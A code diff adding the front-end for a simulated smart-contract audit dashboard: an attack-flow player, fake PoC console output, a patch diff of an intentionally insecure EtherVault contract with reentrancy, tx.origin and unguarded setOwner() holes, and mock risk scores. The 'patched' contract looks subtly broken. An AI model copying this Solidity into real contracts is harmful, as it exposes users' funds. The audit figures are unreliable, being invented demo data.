+      (st.flag?'<span class="chip ml-auto self-center h-6 px-2 inline-flex items-center rounded border border-crit/50 bg-crit/10 text-crit text-[9px] font-extrabold tracking-widest uppercase">exploit</span>':'')+
+    '</li>';
+  }).join('');
+}
+function renderPoC(){
+  const a=exp.attack;
+  $('#flowTarget').textContent=a.target.split(' · ')[0];
+  $('#foundryCode').innerHTML=hl(a.foundry,'sol');$('#foundryCode').dataset.raw=a.foundry;
+  $('#hardhatCode').innerHTML=hl(a.hardhat,'ts');$('#hardhatCode').dataset.raw=a.hardhat;
+}
+function stepTo(i){const n=buildSteps().length;exp.active=Math.max(0,Math.min(n,i));renderSequence();renderSteps();}
+function stopPlay(){if(exp.timer)clearInterval(exp.timer);exp.timer=null;exp.playing=false;$('#flowPlay').innerHTML='▶ Play Attack';}
+$('#flowPlay').addEventListener('click',()=>{
+  if(exp.playing){stopPlay();return;}
+  const n=buildSteps().length;
+  if(exp.active>=n)exp.active=0;
+  exp.playing=true;$('#flowPlay').innerHTML='❚❚ Pause';
+  const spd=exp.speed[+$('#speedRange').value-1];
+  stepTo(exp.active+1);
+  exp.timer=setInterval(()=>{
+    if(exp.active>=n){stopPlay();pushConsole();return;}
+    stepTo(exp.active+1);
+  },spd);
+});
+$('#flowNext').addEventListener('click',()=>{stopPlay();const n=buildSteps().length;if(exp.active<n){stepTo(exp.active+1);if(exp.active>=n)pushConsole();}});
+$('#flowPrev').addEventListener('click',()=>{stopPlay();stepTo(exp.active-1);});
+$('#flowReset').addEventListener('click',()=>{stopPlay();exp.active=0;renderSequence();renderSteps();$('#drainBanner').classList.add('hidden');});
+$('#loopsRange').addEventListener('input',e=>{exp.loops=+e.target.value;$('#loopsVal').textContent=exp.loops+'×';updateProj();renderSequence();renderSteps();});
+$('#liqRange').addEventListener('input',e=>{exp.liq=+e.target.value+0.4;$('#liqVal').textContent=exp.liq.toFixed(2);updateProj();renderSequence();renderSteps();});
+$('#speedRange').addEventListener('input',e=>{$('#speedVal').textContent=['0.6×','1.0×','1.8×'][+e.target.value-1];});
+function updateProj(){
+  const drained=Math.min(exp.loops,Math.max(0,Math.round(exp.liq-0.01)));
+  $('#projLoss').textContent=drained.toFixed(2)+' ETH';
+  $('#projRoi').textContent=Math.round(drained/1*100)+'%';
+}
+function pushConsole(){
+  const box=$('#attackConsole');
+  box.innerHTML=exp.attack.console.map(l=>'<div class="console-line">'+l+'</div>').join('');
+  box.scrollTop=box.scrollHeight;
+}
+$$('.xtab').forEach(b=>b.addEventListener('click',()=>{
+  $$('.xtab').forEach(x=>x.className='xtab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300');
+  b.className='xtab chip h-11 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px';
+  ['steps','foundry','hardhat','console'].forEach(k=>$('#xpane-'+k).classList.toggle('hidden',k!==b.dataset.xtab));
+}));
+$$('.run-poc').forEach(b=>b.addEventListener('click',()=>{
+  const kind=b.dataset.run,box=$('#pocConsole');
+  const lines = kind==='foundry'
+    ? ['$ forge build','[⠊] Compiling 24 files with 0.8.19','Compiler run successful!','$ forge test --match-test testExploit -vvv','<span class="text-safe">[PASS]</span> testExploit() (gas: 421_884)','Suite result: <span class="text-safe">ok</span>. 1 passed; 0 failed','<span class="text-crit">⚠ EXPLOIT REPRODUCED — patch diperlukan sebelum deploy</span>']
+    : ['$ npx hardhat compile','Compiled 18 Solidity files successfully','$ npx hardhat test --grep "exploit"','  ✓ drains the vault via receive() callback (412ms)','  1 passing (2s)','<span class="text-crit">⚠ EXPLOIT REPRODUCED — patch diperlukan sebelum deploy</span>'];
+  typeLines(box,lines,300,()=>{toast('PoC berhasil dijalankan — celah terbukti nyata.',kind==='foundry'?'err':'warn');});
+}));
+$('#clearConsole').addEventListener('click',()=>{$('#attackConsole').innerHTML='';});
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 2 — PATCH STUDIO
+   ═══════════════════════════════════════════════════════════ */
+const PATCHES=[
+ {id:'guard',title:'Pasang ReentrancyGuard + CEI',sev:'critical',delta:28,fixes:'Reentrancy pada withdraw()',
+  desc:'Import OpenZeppelin ReentrancyGuard, tambahkan modifier nonReentrant, dan pindahkan state update sebelum external call.'},
+ {id:'origin',title:'Ganti tx.origin → msg.sender (Ownable)',sev:'critical',delta:18,fixes:'tx.origin authentication',
+  desc:'Warisi Ownable, gunakan onlyOwner, dan hapus seluruh pemakaian tx.origin.'},
+ {id:'access',title:'Tambah access control pada setter',sev:'high',delta:16,fixes:'setOwner() tanpa otoritas',
+  desc:'Batasi fungsi sensitif dengan onlyOwner + emit OwnershipTransferred.'},
+ {id:'safeerc',title:'Upgrade ke SafeERC20 / cek return value',sev:'medium',delta:8,fixes:'Unchecked ERC-20 transfer',
+  desc:'Gunakan safeTransfer & validasi zero-address sebelum state write.'},
+ {id:'events',title:'Emit events + custom errors',sev:'low',delta:6,fixes:'Silent state change & gas waste',
+  desc:'Tambahkan event Deposited/Withdrawn dan custom error untuk menghemat ±60 gas per revert.'}
+];
+const DIFF=[
+ {t:'ctx',s:'// SPDX-License-Identifier: MIT'},
+ {t:'del',p:'guard',s:'pragma solidity ^0.8.19;'},
+ {t:'add',p:'guard',s:'pragma solidity ^0.8.24;'},
+ {t:'blank'},
+ {t:'add',p:'origin',s:'import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";'},
+ {t:'add',p:'guard',s:'import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";'},
+ {t:'add',p:'safeerc',s:'import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";'},
+ {t:'add',p:'origin',s:'import {console} from "forge-std/console.sol";'},
+ {t:'blank'},
+ {t:'del',p:'origin',s:'/// @title EtherVault — INSECURE DEMO (vibe-coded)'},
+ {t:'add',p:'origin',s:'/// @title EtherVault — AI-patched with VibeProof'},
+ {t:'add',p:'origin',s:'/// @notice ReentrancyGuard + Ownable + checks-effects-interactions'},
+ {t:'del',p:'origin',s:'contract EtherVault {'},
+ {t:'add',p:'origin',s:'contract EtherVault is Ownable, ReentrancyGuard {'},
+ {t:'add',p:'safeerc',s:'    using SafeERC20 for IERC20;'},
+ {t:'ctx',s:'    mapping(address => uint256) public balances;'},
+ {t:'del',p:'origin',s:'    address public owner;'},
+ {t:'blank'},
+ {t:'del',p:'events',s:'    constructor() {'},
+ {t:'add',p:'events',s:'    event Deposited(address indexed user, uint256 amount);'},
+ {t:'add',p:'events',s:'    event Withdrawn(address indexed user, uint256 amount);'},
+ {t:'add',p:'events',s:'    event EmergencyDrain(address indexed to, uint256 amount);'},
+ {t:'add',p:'events',s:'    error ZeroAmount();'},
+ {t:'add',p:'events',s:'    error TransferFailed();'},
+ {t:'blank'},
+ {t:'del',p:'origin',s:'        owner = tx.origin;'},
+ {t:'add',p:'origin',s:'    constructor() Ownable(msg.sender) {}'},
+ {t:'ctx',s:'    }'},
+ {t:'blank'},
+ {t:'del',p:'events',s:'    function deposit() external payable {'},
+ {t:'add',p:'events',s:'    function deposit() external payable nonReentrant {'},
+ {t:'ctx',s:'        balances[msg.sender] += msg.value;'},
+ {t:'add',p:'events',s:'        emit Deposited(msg.sender, msg.value);'},
+ {t:'ctx',s:'    }'},
+ {t:'blank'},
+ {t:'del',p:'guard',s:'    function withdraw() external {'},
+ {t:'add',p:'guard',s:'    function withdraw() external nonReentrant {'},
+ {t:'ctx',s:'        uint256 bal = balances[msg.sender];'},
+ {t:'del',p:'events',s:'        require(bal > 0, "No funds");'},
+ {t:'add',p:'events',s:'        if (bal == 0) revert ZeroAmount();'},
+ {t:'blank'},
+ {t:'add',p:'guard',s:'        // ✔ EFFECTS sebelum INTERACTIONS (checks-effects-interactions)'},
+ {t:'add',p:'guard',s:'        balances[msg.sender] = 0;'},
+ {t:'del',p:'guard',s:'        (bool ok, ) = msg.sender.call{value: bal}("");'},
+ {t:'del',p:'events',s:'        require(ok, "Transfer failed");'},
+ {t:'add',p:'guard',s:'        (bool ok, ) = msg.sender.call{value: bal}("");'},
+ {t:'add',p:'events',s:'        if (!ok) revert TransferFailed();'},
+ {t:'add',p:'events',s:'        emit Withdrawn(msg.sender, bal);'},
+ {t:'blank'},
+ {t:'del',p:'guard',s:'        balances[msg.sender] = 0;'},
+ {t:'ctx',s:'    }'},
+ {t:'blank'},
+ {t:'del',p:'origin',s:'    function emergencyWithdraw(address payable _to) public {'},
+ {t:'add',p:'origin',s:'    function emergencyWithdraw(address payable _to) external onlyOwner nonReentrant {'},
+ {t:'del',p:'origin',s:'        require(tx.origin == owner, "Not owner");'},
+ {t:'add',p:'safeerc',s:'        require(_to != address(0), "zero address");'},
+ {t:'ctx',s:'        _to.transfer(address(this).balance);'},
+ {t:'add',p:'events',s:'        emit EmergencyDrain(_to, address(this).balance);'},
+ {t:'ctx',s:'    }'},
+ {t:'blank'},
+ {t:'del',p:'access',s:'    function setOwner(address _new) external {'},
+ {t:'add',p:'access',s:'    function setOwner(address _new) external onlyOwner {'},
+ {t:'add',p:'access',s:'        require(_new != address(0), "zero address");'},
+ {t:'ctx',s:'        owner = _new;'},
+ {t:'add',p:'access',s:'        emit OwnershipTransferred(owner, _new);'},
+ {t:'ctx',s:'    }'},
+ {t:'blank'},
+ {t:'ctx',s:'    receive() external payable {'},
+ {t:'ctx',s:'        balances[msg.sender] += msg.value;'},
+ {t:'ctx',s:'    }'},
+ {t:'ctx',s:'}'}
+];
+const patchState={selected:new Set(['guard']),score:28,reaudited:false};
+
+function patchedScore(){return Math.min(99,28+PATCHES.filter(p=>patchState.selected.has(p.id)).reduce((s,p)=>s+p.delta,0));}
+function patchedCounters(){
+  const has=id=>patchState.selected.has(id);
+  return {
+    c: has('guard')&&has('origin')?0:2,
+    h: has('access')?(has('origin')?0:1):2,
+    m: has('safeerc')?0:1,
+    l: has('events')?0:1
+  };
+}
+function renderPatchList(){
+  $('#patchList').innerHTML=PATCHES.map(p=>{
+    const on=patchState.selected.has(p.id);
+    return '<label class="flex items-start gap-3 px-4 py-3 cursor-pointer hover:bg-ink-700 transition-colors">'+
+      '<input type="checkbox" data-patch="'+p.id+'" '+(on?'checked':'')+' class="mt-1 w-4 h-4 accent-cyan-400 shrink-0"/>'+
+      '<span class="min-w-0 flex-1">'+
+        '<span class="flex flex-wrap items-center gap-2"><span class="text-[12.5px] font-bold text-zinc-100">'+p.title+'</span>'+
+        '<span class="chip h-5 px-1.5 inline-flex items-center rounded border text-[9px] font-extrabold tracking-widest uppercase '+SEV_CHIP[p.sev]+'">'+p.sev+'</span>'+
+        '<span class="chip h-5 px-1.5 inline-flex items-center rounded bg-safe/10 border border-safe/40 text-safe font-mono text-[9.5px] font-bold">+'+p.delta+'</span></span>'+
+        '<span class="block mt-1 text-[11.5px] text-zinc-500">'+p.desc+'</span>'+
+        '<span class="block mt-1 font-mono text-[10px] text-zinc-600">fixes: '+p.fixes+'</span>'+
+      '</span></label>';
+  }).join('');
+  $$('#patchList input').forEach(i=>i.addEventListener('change',()=>{
+    i.checked?patchState.selected.add(i.dataset.patch):patchState.selected.delete(i.dataset.patch);
+    patchState.reaudited=false;applyPatchUI();
+  }));
+}
+function diffRows(){
+  const rows=[];let L=1,R=1;
+  DIFF.forEach(e=>{
+    if(e.t==='blank'){rows.push({t:'blank',l:'',r:'',ln:'',rn:''});return;}
+    if(e.t==='ctx'){rows.push({t:'ctx',l:e.s,r:e.s,ln:L++,rn:R++});return;}
+    if(e.t==='del'){
+      if(patchState.selected.has(e.p)){rows.push({t:'del',l:e.s,r:null,ln:L++,rn:''});}
+      else{rows.push({t:'ctx',l:e.s,r:e.s,ln:L++,rn:R++});}
+      return;
+    }
+    if(e.t==='add'&&patchState.selected.has(e.p)){rows.push({t:'add',l:null,r:e.s,ln:'',rn:R++});}
+  });
+  // merge adjacent del/add into aligned pairs
+  const out=[];
+  for(let i=0;i<rows.length;i++){
+    const cur=rows[i],nxt=rows[i+1];
+    if(cur.t==='del'&&nxt&&nxt.t==='add'){out.push({t:'mod',l:cur.l,r:nxt.r,ln:cur.ln,rn:nxt.rn});i++;}
+    else out.push(cur);
+  }
+  return out;
+}
+function renderDiff(){
+  const rows=diffRows();
+  $('#diffSplit').innerHTML=rows.map(r=>{
+    if(r.t==='blank')return '<div class="d-row"><div class="bg-ink-900 px-2 py-1 text-right font-mono text-[10px] text-zinc-700"></div><div class="bg-ink-900"></div><div class="bg-ink-900 px-2 py-1 text-right font-mono text-[10px] text-zinc-700"></div><div class="bg-ink-900"></div></div>';
+    const lc=r.t==='add'?'d-ctx':(r.t==='del'?'d-del':(r.t==='mod'?'d-del':'d-ctx'));
+    const rc=r.t==='del'?'d-ctx':(r.t==='add'?'d-add':(r.t==='mod'?'d-add':'d-ctx'));
+    const mark=r.t==='mod'||r.t==='del'?'−':(r.t==='add'?'+':' ');
+    const mark2=r.t==='mod'||r.t==='add'?'+':' ';
+    return '<div class="d-row font-mono text-[11.5px] leading-[1.55]">'+
+      '<div class="px-2 py-0.5 text-right text-zinc-700 bg-ink-900 select-none border-r border-zinc-800/70">'+(r.ln||'')+'</div>'+
+      '<div class="px-3 py-0.5 whitespace-pre overflow-x-auto '+lc+' text-zinc-300">'+(r.l!=null?'<span class="'+(r.t==='mod'||r.t==='del'?'text-crit':'text-zinc-700')+' mr-2">'+mark+'</span>'+hl(r.l,'sol'):'')+'</div>'+
+      '<div class="px-2 py-0.5 text-right text-zinc-700 bg-ink-900 select-none border-r border-zinc-800/70">'+(r.rn||'')+'</div>'+
+      '<div class="px-3 py-0.5 whitespace-pre overflow-x-auto '+rc+' text-zinc-300">'+(r.r!=null?'<span class="'+(r.t==='mod'||r.t==='add'?'text-safe':'text-zinc-700')+' mr-2">'+mark2+'</span>'+hl(r.r,'sol'):'')+'</div>'+
+    '</div>';
+  }).join('');
+
+  const uni=['--- a/src/EtherVault.sol','+++ b/src/EtherVault.sol','@@ AI-generated remediation patch @@'];
+  diffRows().forEach(r=>{
+    if(r.t==='blank'){uni.push(' ');return;}
+    if(r.t==='mod'){uni.push('-'+r.l);uni.push('+'+r.r);return;}
+    if(r.t==='del'){uni.push('-'+r.l);return;}
+    if(r.t==='add'){uni.push('+'+r.r);return;}
+    uni.push(' '+r.l);
+  });
+  patchState.unified=uni.join('\n');
+  $('#diffUnified').innerHTML=uni.map(l=>{
+    const cls=l.startsWith('+')?'text-safe':l.startsWith('-')?'text-crit':l.startsWith('@')?'text-cyber':'text-zinc-500';
+    return '<span class="'+cls+'">'+esc(l)+'</span>';
+  }).join('\n');
+  $('#diffUnified').dataset.raw=patchState.unified;
+  $('#diffScore').textContent=patchedScore();
+}
+function patchedSource(){
+  const out=[];
+  DIFF.forEach(e=>{
+    if(e.t==='blank'){out.push('');return;}
+    if(e.t==='ctx'){out.push(e.s);return;}
+    if(e.t==='del'){if(!patchState.selected.has(e.p))out.push(e.s);return;}
+    if(e.t==='add'&&patchState.selected.has(e.p))out.push(e.s);
+  });
+  return out.join('\n');
+}
+function applyPatchUI(){
+  const sc=patchedScore(),g=gradeOf(sc),c=patchedCounters();
+  $('#scoreAfter').textContent=sc;
+  $('#scoreAfter').className='font-mono text-lg font-extrabold '+(g.key==='safe'?'text-safe':g.key==='warn'?'text-warn':'text-crit');
+  $('#patchRing').innerHTML=ringSVG(sc,72,5);
+  $('#patchVerdict').textContent=g.verdict;
+  $('#patchVerdict').className='chip text-[11px] font-extrabold tracking-widest uppercase '+(g.key==='safe'?'text-safe':g.key==='warn'?'text-warn':'text-crit');
+  $('#patchCounters').textContent='C '+c.c+' · H '+c.h+' · M '+c.m+' · L '+c.l;
+  renderDiff();
+}
+$('#applyAll').addEventListener('click',()=>{PATCHES.forEach(p=>patchState.selected.add(p.id));renderPatchList();applyPatchUI();toast('5 patch diterapkan.','ok');});
+$('#clearAll').addEventListener('click',()=>{patchState.selected.clear();renderPatchList();applyPatchUI();toast('Patch direset ke source vulnerable.','info');});
+$$('.dtab').forEach(b=>b.addEventListener('click',()=>{
+  $$('.dtab').forEach(x=>x.className='dtab chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-zinc-400 text-[11px] font-bold hover:text-white');
+  b.className='dtab chip h-8 px-3 rounded-lg border border-cyber/50 bg-cyber/10 text-cyber text-[11px] font-bold';
+  const u=b.dataset.dtab==='unified';
+  $('#diffSplit').classList.toggle('hidden',u);$('#diffUnified').classList.toggle('hidden',!u);
+}));
+$('#reauditBtn').addEventListener('click',()=>{
+  const box=$('#reauditLog');box.classList.remove('hidden');
+  const sc=patchedScore(),c=patchedCounters();
+  typeLines(box,[
+    '<span class="text-cyber">›</span> re-parsing patched AST · '+DIFF.filter(e=>e.p&&patchState.selected.has(e.p)).length+' hunks applied',
+    '<span class="text-cyber">›</span> re-running 42 heuristics (SWC registry)…',
+    '<span class="text-cyber">›</span> reentrancy graph traversal → '+(c.c===0?'<span class="text-safe">no vulnerable path</span>':'<span class="text-crit">'+c.c+' critical</span>'),
+    '<span class="text-cyber">›</span> access control matrix → '+(c.h===0?'<span class="text-safe">all setters guarded</span>':c.h+' high'),
+    '<span class="text-cyber">›</span> new keccak256 code hash: '+shortHash(keccakMock(patchedSource()),8,4),
+    '<span class="text-safe">✓ Re-audit selesai — Security Score 28 → '+sc+' ('+gradeOf(sc).verdict+')</span>'
+  ],300,()=>{
+    patchState.reaudited=true;
+    animateScore(sc);
+    toast('Re-audit: score melonjak 28 → '+sc,'ok');
+  });
+});
+function animateScore(target){
+  const from=28,el=$('#scoreAfter'),ring=$('#patchRing');let t0=null;
+  const tick=ts=>{if(!t0)t0=ts;const p=Math.min(1,(ts-t0)/900);const v=Math.round(from+(target-from)*(1-Math.pow(1-p,3)));el.textContent=v;ring.innerHTML=ringSVG(v,72,5);if(p<1)requestAnimationFrame(tick);};
+  requestAnimationFrame(tick);
+}
+$('#exportRemix').addEventListener('click',()=>{
+  copyText(patchedSource(),'Patched source disalin');
+  window.open('https://remix.ethereum.org','_blank');
+  toast('Remix terbuka — paste source yang sudah disalin.','info');
+});
+$('#exportSol').addEventListener('click',()=>{download('EtherVault.patched.sol',patchedSource());toast('EtherVault.patched.sol diunduh.','ok');});
+$('#exportDiff').addEventListener('click',()=>copyText(patchState.unified||'','Unified diff disalin'));
+$('#exportZip').addEventListener('click',()=>{
+  const bundle=[
+    '# VibeProof Patch Bundle (simulated zip contents)','',
+    'foundry.toml','  [profile.default]','  src = "src"','  out = "out"','  libs = ["lib"]','',
+    'src/EtherVault.sol','----------------------------------------',patchedSource(),'',
+    'test/ExploitTest.t.sol','----------------------------------------',ATTACKS[0].foundry,'',
+    'remix-urls.txt','https://remix.ethereum.org/#version=soljson-v0.8.24+commit.e11b9ed9.js',
+    'vibeproof-report.md','Security Score: '+patchedScore()+'/100 · Verdict: '+gradeOf(patchedScore()).verdict
+  ].join('\n');
+  download('vibeproof-patch-bundle.txt',bundle);
+  toast('Bundle Foundry diekspor (simulated zip).','ok');
+});
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 3 — RISK RADAR
+   ═══════════════════════════════════════════════════════════ */
+const LB=[
+ {n:'AstroSwap DEX',cat:'DeFi',score:96,aud:'certified',tvl:'48.2M BOT',d:+2.1},
+ {n:'BotLend Markets',cat:'DeFi',score:92,aud:'certified',tvl:'31.7M BOT',d:+1.4},
+ {n:'Nebula Bridge',cat:'Bridge',score:88,aud:'certified',tvl:'22.4M BOT',d:+0.6},
+ {n:'PixelPets NFT',cat:'NFT',score:94,aud:'certified',tvl:'4.1M BOT',d:+3.2},
+ {n:'YieldRouter V2',cat:'DeFi',score:54,aud:'warning',tvl:'9.8M BOT',d:-4.8},
+ {n:'BotArena Gaming',cat:'Gaming',score:83,aud:'certified',tvl:'6.3M BOT',d:+0.9},
+ {n:'MetaPay Wallet',cat:'Infra',score:89,aud:'certified',tvl:'12.9M BOT',d:+1.1},
+ {n:'FlashLoanPool',cat:'DeFi',score:35,aud:'critical',tvl:'7.6M BOT',d:-9.4},
+ {n:'Genesis Pass NFT',cat:'NFT',score:38,aud:'unaudited',tvl:'1.2M BOT',d:-6.1},
+ {n:'GovBridge DAO',cat:'Bridge',score:91,aud:'certified',tvl:'18.5M BOT',d:+2.7},
+ {n:'StableSwap AMM',cat:'DeFi',score:69,aud:'warning',tvl:'15.3M BOT',d:-1.2},
+ {n:'OracleAggregator',cat:'Infra',score:90,aud:'certified',tvl:'—',d:+0.4},
+ {n:'PresaleVault',cat:'DeFi',score:22,aud:'critical',tvl:'3.4M BOT',d:-12.6},
+ {n:'AirdropClaimer',cat:'Gaming',score:87,aud:'certified',tvl:'0.9M BOT',d:+1.8}
+];
+const AUDIT_CHIP={certified:'border-safe/50 bg-safe/10 text-safe',warning:'border-warn/50 bg-warn/10 text-warn',critical:'border-crit/50 bg-crit/10 text-crit',unaudited:'border-zinc-600 bg-zinc-700/40 text-zinc-400'};
+const AUDIT_LABEL={certified:'CERTIFIED SAFE',warning:'WARNINGS',critical:'CRITICAL',unaudited:'UNAUDITED'};
+let lbCat='All';
+function renderLbCats(){
+  const cats=['All','DeFi','NFT','Bridge','Gaming','Infra'];
+  $('#lbCats').innerHTML=cats.map(c=>'<button data-cat="'+c+'" class="lbcat chip h-7 px-2.5 rounded-full border text-[10.5px] font-bold transition-colors '+(c===lbCat?'border-cyber/50 bg-cyber/10 text-cyber':'border-zinc-700 bg-ink-700 text-zinc-400 hover:text-white')+'">'+c+'</button>').join('');
+  $$('.lbcat').forEach(b=>b.addEventListener('click',()=>{lbCat=b.dataset.cat;renderLbCats();renderLb();}));
+}
+function renderLb(){
+  const list=LB.filter(x=>lbCat==='All'||x.cat===lbCat).sort((a,b)=>b.score-a.score);
+  $('#lbBody').innerHTML=list.map((p,i)=>{
+    const g=gradeOf(p.score);
+    return '<tr>'+
+      '<td class="px-4 py-2.5 text-zinc-500">'+String(i+1).padStart(2,'0')+'</td>'+
+      '<td class="px-3 py-2.5"><span class="text-zinc-100 font-bold">'+p.n+'</span></td>'+
+      '<td class="px-3 py-2.5 hidden sm:table-cell"><span class="chip h-5 px-2 inline-flex items-center rounded bg-ink-700 border border-zinc-800 text-zinc-400 text-[9.5px]">'+p.cat+'</span></td>'+
+      '<td class="px-3 py-2.5"><span class="flex items-center gap-2"><span class="font-bold" style="color:'+g.color+'">'+p.score+'</span><span class="flex-1 h-1.5 rounded-full bg-ink-600 overflow-hidden min-w-[40px]"><span class="block h-full rounded-full" style="width:'+p.score+'%;background:'+g.color+'"></span></span></span></td>'+
+      '<td class="px-3 py-2.5 hidden md:table-cell"><span class="chip h-5 px-2 inline-flex items-center rounded border text-[9px] font-extrabold tracking-widest uppercase '+AUDIT_CHIP[p.aud]+'">'+AUDIT_LABEL[p.aud]+'</span></td>'+
+      '<td class="px-3 py-2.5 hidden lg:table-cell text-zinc-400">'+p.tvl+'</td>'+
+      '<td class="px-4 py-2.5 text-right '+(p.d>=0?'text-safe':'text-crit')+'">'+(p.d>=0?'▲':'▼')+' '+Math.abs(p.d).toFixed(1)+'</td>'+
+    '</tr>';
+  }).join('');
+}
+function renderSafety(){
+  const safe=LB.filter(p=>p.score>=80).length,total=LB.length,pct=Math.round(safe/total*100);
+  const R=92,C=Math.PI*R; // semicircle
+  const g=$('#safetyGauge');
+  g.innerHTML='<path d="M18 118 A92 92 0 0 1 202 118" fill="none" stroke="#1f232e" stroke-width="14" stroke-linecap="round"/>'+
+    '<path id="gaugeArc" d="M18 118 A92 92 0 0 1 202 118" fill="none" stroke="#10b981" stroke-width="14" stroke-linecap="round" stroke-dasharray="0 '+C+'" style="transition:stroke-dasharray 1.1s cubic-bezier(.22,1,.36,1)"/>'+
+    '<text x="110" y="112" text-anchor="middle" font-size="10" fill="#71717a" font-family="monospace">SAFE / AT-RISK</text>';
+  requestAnimationFrame(()=>requestAnimationFrame(()=>{$('#gaugeArc').setAttribute('stroke-dasharray',(C*pct/100)+' '+C);}));
+  $('#safetyPct').textContent=pct+'%';
+  const risky=total-safe;
+  $('#safetyBreak').innerHTML=[
+    ['Certified safe (≥80)',safe,'#10b981'],
+    ['Warning (50–79)',LB.filter(p=>p.score>=50&&p.score<80).length,'#f59e0b'],
+    ['Critical (<50)',LB.filter(p=>p.score<50).length,'#f43f5e'],
+    ['Unaudited bytecode',risky+3,'#52525b']
+  ].map(([k,v,c])=>'<li class="flex items-center gap-2"><span class="w-2.5 h-2.5 rounded-sm shrink-0" style="background:'+c+'"></span><span class="text-zinc-400 flex-1">'+k+'</span><span class="text-white font-bold">'+v+'</span></li>').join('');
+
+  const cats=['DeFi','NFT','Bridge','Gaming','Infra'];
+  $('#catBars').innerHTML=cats.map(c=>{
+    const arr=LB.filter(p=>p.cat===c),avg=Math.round(arr.reduce((s,p)=>s+p.score,0)/arr.length),g=gradeOf(avg);
+    return '<div><div class="flex items-center gap-2 font-mono text-[11px]"><span class="w-14 text-zinc-400">'+c+'</span><span class="flex-1 h-2 rounded-full bg-ink-600 overflow-hidden"><span class="block h-full rounded-full" style="width:'+avg+'%;background:'+g.color+'"></span></span><span class="w-8 text-right font-bold" style="color:'+g.color+'">'+avg+'</span></div></div>';
+  }).join('');
+}
+const WATCH_NAMES=['AirdropDistributor','LiquidStakingPool','NftMarketplace','PerpVault','BridgeMessenger','RewardEscrow','GovernorBravo','MemeLauncher','StablePool','ZkVerifier','LootboxRandom','FeeCollector'];
+const WATCH_STATUS=[
+ {k:'unverified',label:'Unverified Bytecode',chip:'border-zinc-600 bg-zinc-700/40 text-zinc-400'},
+ {k:'pending',label:'Pending VibeProof Audit',chip:'border-warn/50 bg-warn/10 text-warn'},
+ {k:'safe',label:'Certified Safe',chip:'border-safe/50 bg-safe/10 text-safe'},
+ {k:'crit',label:'Critical Risk Detected',chip:'border-crit/50 bg-crit/10 text-crit'}
+];
+let watchOn=true,watchN=0;
+function pushWatch(){
+  const name=WATCH_NAMES[Math.floor(Math.random()*WATCH_NAMES.length)]+'.sol';
+  const st=WATCH_STATUS[Math.floor(Math.random()*WATCH_STATUS.length)];
+  const addr='0x'+randHex(40);
+  const net=state.network;
+  const score=st.k==='safe'?(80+Math.floor(Math.random()*19)):st.k==='crit'?(8+Math.floor(Math.random()*35)):st.k==='pending'?null:(40+Math.floor(Math.random()*30));
+  const el=document.createElement('div');
+  el.className='rise-in px-4 py-3 hover:bg-ink-700/50 transition-colors';
+  el.innerHTML='<div class="flex items-center gap-2.5">'+
+      '<span class="w-1.5 h-1.5 rounded-full '+(st.k==='safe'?'bg-safe':st.k==='crit'?'bg-crit':st.k==='pending'?'bg-warn':'bg-zinc-500')+' shrink-0"></span>'+
+      '<span class="font-mono text-[12px] font-bold text-zinc-100 truncate">'+name+'</span>'+
+      (score?'<span class="chip ml-auto h-5 px-2 inline-flex items-center rounded font-mono text-[10px] font-extrabold" style="color:'+gradeOf(score).color+'">'+score+'</span>':'<span class="ml-auto"></span>')+
+    '</div>'+
+    '<div class="mt-1.5 flex flex-wrap items-center gap-2 font-mono text-[10px] text-zinc-600">'+
+      '<span class="truncate">'+shortHash(addr,8,6)+'</span>'+
+      '<span class="chip h-5 px-2 inline-flex items-center rounded border '+st.chip+' text-[9px] font-extrabold tracking-widest uppercase">'+st.label+'</span>'+
+      '<span class="ml-auto">just now · '+(net==='mainnet'?'677':'968')+'</span>'+
+    '</div>'+
+    '<div class="mt-2 flex gap-1.5">'+
+      (st.k==='safe'?'':'<button class="chip h-7 px-2.5 rounded-md border border-cyber/40 bg-cyber/10 text-cyber text-[10px] font-bold hover:bg-cyber/20 transition-colors">Scan now</button>')+
+      '<button class="chip h-7 px-2.5 rounded-md border border-zinc-700 bg-ink-700 text-zinc-400 text-[10px] font-bold hover:text-white transition-colors">View bytecode</button>'+
+    '</div>';
+  el.querySelector('button').addEventListener('click',()=>toast(st.k==='safe'?'Sudah tersertifikasi — membuka proof portal.':'Scan dijadwalkan untuk '+name,'info'));
+  const feed=$('#watchFeed');
+  feed.prepend(el);
+  while(feed.children.length>24)feed.lastElementChild.remove();
+  watchN++;
+}
+function renderWatchReset(){$('#watchFeed').innerHTML='';watchN=0;for(let i=0;i<6;i++)pushWatch();}
+$('#watchToggle').addEventListener('click',()=>{watchOn=!watchOn;$('#watchToggle').textContent=watchOn?'Pause':'Resume';$('#watchToggle').className='chip h-8 px-3 rounded-lg border text-[11px] font-bold transition-colors '+(watchOn?'border-zinc-700 bg-ink-700 text-zinc-200 hover:border-cyber/60':'border-safe/50 bg-safe/10 text-safe');});
+setInterval(()=>{if(watchOn&&state.view==='radar')pushWatch();},2800);
+
+/* ═══════════════════════════════════════════════════════════
+   VIEW 4 — PROOF PORTAL & PDF
+   ═══════════════════════════════════════════════════════════ */
+const PROOFS=[
+ {name:'SafeDAppVault.sol',score:96,summary:'ReentrancyGuard + checks-effects-interactions diterapkan konsisten, akses administratif dibatasi Ownable, dan seluruh interaksi token memakai SafeERC20. Tidak ditemukan vektor eksploitasi langsung.',findings:[['Low','_pricePerShare() mengandalkan balanceOf() token','59','Gunakan accumulator internal / oracle independen']],hash:keccakMock('proof:SafeDAppVault'),tx:keccakMock('tx:SafeDAppVault'),block:3412880-180,auditor:'0x38bF4d01c9aE77e5b021Ff6cD81a20A4',min:61},
+ {name:'GovBridge.sol',score:92,summary:'Multisig threshold tepat dan message replay protection lengkap. Disarankan menambahkan timelock untuk seluruh operasi upgrade.',findings:[['Medium','Upgrade tanpa timelock','88','Tambahkan TimelockController 48 jam'],['Low','Event signature tidak indexed','104','Index parameter address agar ter-filter murah']],hash:keccakMock('proof:GovBridge'),tx:keccakMock('tx:GovBridge'),block:3412880-420,auditor:'0x38bF4d01c9aE77e5b021Ff6cD81a20A4',min:480},
